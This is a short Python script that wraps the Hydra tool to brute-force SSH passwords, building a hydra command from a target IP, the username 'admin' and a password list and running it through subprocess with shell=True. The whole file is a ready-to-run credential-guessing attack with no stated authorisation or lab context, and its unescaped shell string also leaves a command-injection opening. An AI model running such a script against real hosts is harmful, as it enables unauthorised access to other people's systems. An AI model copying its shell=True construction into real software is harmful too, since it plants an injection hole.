import subprocess

def run_hydra(target_ip, username, password_list):
    try:
        # Construct Hydra command
        command = f"hydra -l {username} -P {password_list} ssh://{target_ip}"
        
        # Run command and capture output
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Print output
        print(result.stdout)
        
        # Check if there is an error
        if result.stderr:
            print(f"Error: {result.stderr}")
    
    except Exception as e:
        print(f"Exception occurred: {e}")

if __name__ == "__main__":
    # Example target information
    target_ip = "192.168.1.10"
    username = "admin"
    password_list = "/path/to/password_list.txt"
    
    # Run Hydra password cracking
    run_hydra(target_ip, username, password_list)
